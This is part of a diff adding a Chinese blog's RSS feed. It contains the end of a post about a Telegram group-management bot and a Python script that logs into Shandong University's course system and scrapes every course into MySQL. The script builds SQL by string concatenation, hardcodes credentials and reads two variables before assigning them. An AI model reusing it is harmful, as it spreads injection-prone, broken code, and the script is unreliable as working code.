+            {&#34;text&#34;:&#34;拾取&#34;,&#34;url&#34;:&#34;http://t.me/peekfun&#34;}
+        ],
+        // 第二行按钮
+        [
+            {&#34;text&#34;:&#34;百度&#34;,&#34;url&#34;:&#34;https://baidu.com&#34;},
+            {&#34;text&#34;:&#34;谷歌&#34;,&#34;url&#34;:&#34;https://google.com&#34;}
+        ]
+    ]
+}
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="命令列表">命令列表</h2>
+<ul>
+<li>help - 查看帮助</li>
+<li>add - 添加规则</li>
+<li>del - 删除规则</li>
+<li>list - 列出规则</li>
+<li>admin - 呼叫管理员</li>
+<li>banme - 禁言小游戏</li>
+<li>getid - 查看用户的信息 可回复查看别人</li>
+<li>autoreply - 开关自动回复功能</li>
+<li>autodelete - 开关自动删除消息功能</li>
+<li>replyorder - 开关回复ban/kick命令功能</li>
+<li>banmegame - 开关禁言小游戏功能</li>
+<li>playorderban - 开关玩命令惩罚功能</li>
+<li>banqingzhen - 开关防清真功能</li>
+<li>calladmin - 开关呼叫管理员功能</li>
+<li>welcome - 开关加群欢迎功能</li>
+<li>goodbye - 开关离群送别功能</li>
+<li>deletejoinmessage - 开关删除加群消息功能</li>
+<li>servicelist - 查看机器人功能列表</li>
+<li>deleteallrules - 清空本群所有关键词规则</li>
+<li>deleteallmessage - 删除48小时内所有消息</li>
+</ul>
+<h2 id="开源">开源</h2>
+<p>开源地址： <a href="https://github.com/zu1k/tg-keyword-reply-bot">https://github.com/zu1k/tg-keyword-reply-bot</a></p>
+<h2 id="赞助">赞助</h2>
+<blockquote>
+<p>这里要特别感谢 聪聪，是他赞助了服务器费用。<br>
+聪聪大佬是 Telegram中文社群 的创建者，他的群组和频道是tg上中文交流（不讨论政治、色情、黑产）的一个不错的地方，推荐刚刚开始使用tg的同学加入。<br>
+聪聪的群组 @yxbjx<br>
+聪聪的频道 @YinxiangBiji_News</p>
+</blockquote>
+<p>如果你认为这个机器人为你管理群组提供了帮助，那么期待你的赞助，你的赞助可以帮助机器人运行更长时间，同时你的名字也会被记录到机器人开源页。</p>
+<h3 id="如何赞助">如何赞助</h3>
+<ul>
+<li>通过邮箱联系我，然后索要我的赞赏码或者其他收款方式</li>
+</ul>
+<h2 id="问题反馈">问题反馈</h2>
+<p>目前有效的反馈方式是github上的 <a href="https://github.com/zu1k/tg-keyword-reply-bot/issues" target="_blank" rel="noopener noreffer">Issue页面</a> ，目前仅支持闭源版本问题反馈，反馈时请一次性描述清楚，必要时请附加截图，这样有利于更好的解决问题。</p>
+<p>如果是增加特定功能就不要反馈了，如有需求可以找我或别人定制特定的机器人。</p>
+]]></description></item><item><title>爬取教务系统所有课程并存入数据库</title><link>https://lgf.im/posts/coding/crawl-all-the-courses-of-the-educational-administration-system-and-store-them-in-the-database/</link><pubDate>Mon, 03 Dec 2018 17:57:48 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/crawl-all-the-courses-of-the-educational-administration-system-and-store-them-in-the-database/</guid><description><![CDATA[<p>环境python3.6</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*- coding:utf-8 -*-</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">pymysql</span>
+
+<span class="c1"># Initialize Session</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">ua</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0&#34;</span><span class="p">}</span>
+<span class="n">s</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">ua</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;201700301234&#34;</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;123456&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+    <span class="c1"># Get cookies</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://bkjwxk.sdu.edu.cn&#34;</span><span class="p">)</span>
+
+    <span class="c1"># Set properties to login</span>
+    <span class="n">hs</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+    <span class="n">hs</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">hs</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;j_username=&#34;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s2">&#34;&amp;j_password=&#34;</span> <span class="o">+</span> <span class="n">password</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;http://bkjwxk.sdu.edu.cn/f/login&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded; charset=UTF-8&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://bkjwxk.sdu.edu.cn/b/ajaxLogin&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+
+    <span class="c1"># Check if is successful</span>
+    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="o">!=</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">success</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;登陆出错&#34;</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Detailed message: &#34;</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;登陆成功&#34;</span><span class="p">)</span>
+
+
+<span class="c1"># get one page data</span>
+<span class="k">def</span> <span class="nf">onepage</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;type=kc&amp;currentPage=&#34;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s2">&#34;&amp;kch=&amp;jsh=&amp;skxq=&amp;skjc=&amp;kkxsh=&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;http://bkjwxk.sdu.edu.cn/f/common/main&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded; charset=UTF-8&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://bkjwxk.sdu.edu.cn/b/xk/xs/kcsearch&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+
+<span class="c1"># 向数据库插入一条数据</span>
+<span class="k">def</span> <span class="nf">insertone</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">kch</span><span class="p">,</span> <span class="n">kxh</span><span class="p">,</span> <span class="n">kcm</span><span class="p">,</span> <span class="n">xf</span><span class="p">,</span> <span class="n">kclb</span><span class="p">,</span> <span class="n">kclbmc</span><span class="p">,</span> <span class="n">kkxsh</span><span class="p">,</span> <span class="n">kkxsm</span><span class="p">,</span> <span class="n">kkxsjc</span><span class="p">,</span> <span class="n">jsh</span><span class="p">,</span> <span class="n">ksm</span><span class="p">,</span> <span class="n">sjdd</span><span class="p">):</span>
+    <span class="c1"># 打开数据库连接</span>
+    <span class="n">db</span> <span class="o">=</span> <span class="n">pymysql</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="s2">&#34;kc&#34;</span><span class="p">,</span> <span class="s2">&#34;kc&#34;</span><span class="p">,</span> <span class="s2">&#34;kc&#34;</span><span class="p">,</span> <span class="n">charset</span><span class="o">=</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
+    <span class="c1"># 使用cursor()方法获取操作游标</span>
+    <span class="n">cursor</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="c1"># SQL 插入语句</span>
+    <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;INSERT INTO kcinfo(`id`,`kch`,`kxh`,`kcm`,`xf`,`kclb`,`kclbmc`,`kkxsh`,`kkxsm`,`kkxsjc`,`jsh`,`ksm`,`sjdd`) VALUES (&#39;&#34;</span> <span class="o">+</span> <span class="n">index</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">kch</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">kxh</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">kcm</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">xf</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">kclb</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">kclbmc</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">kkxsh</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">kkxsm</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">kkxsjc</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">jsh</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">ksm</span> <span class="o">+</span> <span class="s2">&#34;&#39;,&#39;&#34;</span> <span class="o">+</span> <span class="n">sjdd</span> <span class="o">+</span> <span class="s2">&#34;&#39;)&#34;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># 执行sql语句</span>
+        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+        <span class="c1"># 提交到数据库执行</span>
+        <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+        <span class="c1"># 如果发生错误则回滚</span>
+        <span class="n">db</span><span class="o">.</span><span class="n">rollback</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">godata</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+    <span class="n">js</span> <span class="o">=</span> <span class="n">onepage</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">js</span><span class="p">[</span><span class="s2">&#34;object&#34;</span><span class="p">][</span><span class="s2">&#34;resultList&#34;</span><span class="p">]:</span>
+        <span class="n">kch</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&#34;KCH&#34;</span><span class="p">]</span> <span class="k">if</span> <span class="n">kch</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="k">else</span> <span class="s2">&#34;&#34;</span>  <span class="c1"># 课程号</span>
+        <span class="n">kxh</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s2">&#34;KXH&#34;</span><span class="p">])</span> <span class="k">if</span> <span class="n">kxh</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="k">else</span> <span class="s2">&#34;&#34;</span>  <span class="c1"># 课序号</span>
+        <span class="n">kcm</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&#34;KCM&#34;</span><span class="p">]</span>  <span class="c1"># 课程名</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">kcm</span><span class="p">:</span> <span class="n">kcm</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+        <span class="n">xf</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s2">&#34;XF&#34;</span><span class="p">])</span>  <span class="c1"># 学分</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">xf</span><span class="p">:</span> <span class="n">xf</span> <span class="o">=</span> <span class="s2">&#34;0&#34;</span>
+        <span class="n">kclb</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&#34;KCLB&#34;</span><span class="p">]</span>  <span class="c1"># 课程类别</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">kclb</span><span class="p">:</span> <span class="n">kclb</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+        <span class="n">kclbmc</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&#34;KCLBMC&#34;</span><span class="p">]</span>  <span class="c1"># 课程类别名称</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">kclbmc</span><span class="p">:</span> <span class="n">kclbmc</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+        <span class="n">kkxsh</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&#34;KKXSH&#34;</span><span class="p">]</span>  <span class="c1"># 开课学院号</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">kkxsh</span><span class="p">:</span> <span class="n">kkxsh</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+        <span class="n">kkxsm</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&#34;KKXSM&#34;</span><span class="p">]</span>  <span class="c1"># 开科学院名</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">kkxsm</span><span class="p">:</span> <span class="n">kkxsm</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+        <span class="n">kkxsjc</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&#34;KKXSJC&#34;</span><span class="p">]</span>  <span class="c1"># 开课学院简称</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">kkxsjc</span><span class="p">:</span> <span class="n">kkxsjc</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+        <span class="n">jsh</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s2">&#34;JSH&#34;</span><span class="p">])</span>  <span class="c1"># 教师号</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">jsh</span><span class="p">:</span> <span class="n">jsh</span> <span class="o">=</span> <span class="s2">&#34;0&#34;</span>
+        <span class="n">ksm</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&#34;JSM&#34;</span><span class="p">]</span>  <span class="c1"># 教师名</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">ksm</span><span class="p">:</span> <span class="n">ksm</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+        <span class="n">sjdd</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">&#34;SJDD&#34;</span><span class="p">]</span>  <span class="c1"># 上课时间/地点</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">sjdd</span><span class="p">:</span> <span class="n">sjdd</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+        <span class="n">index</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s2">&#34;NUM&#34;</span><span class="p">])</span>  <span class="c1"># 序号 无用</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">index</span><span class="p">:</span> <span class="n">index</span> <span class="o">=</span> <span class="s2">&#34;0&#34;</span>
+        <span class="c1"># 插</span>
+        <span class="n">insertone</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">kch</span><span class="p">,</span> <span class="n">kxh</span><span class="p">,</span> <span class="n">kcm</span><span class="p">,</span> <span class="n">xf</span><span class="p">,</span> <span class="n">kclb</span><span class="p">,</span> <span class="n">kclbmc</span><span class="p">,</span> <span class="n">kkxsh</span><span class="p">,</span> <span class="n">kkxsm</span><span class="p">,</span> <span class="n">kkxsjc</span><span class="p">,</span> <span class="n">jsh</span><span class="p">,</span> <span class="n">ksm</span><span class="p">,</span> <span class="n">sjdd</span><span class="p">)</span>
+
+
+<span class="n">login</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">173</span><span class="p">):</span>
+    <span class="n">godata</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;第&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;页完成&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div>]]></description></item></channel></rss>
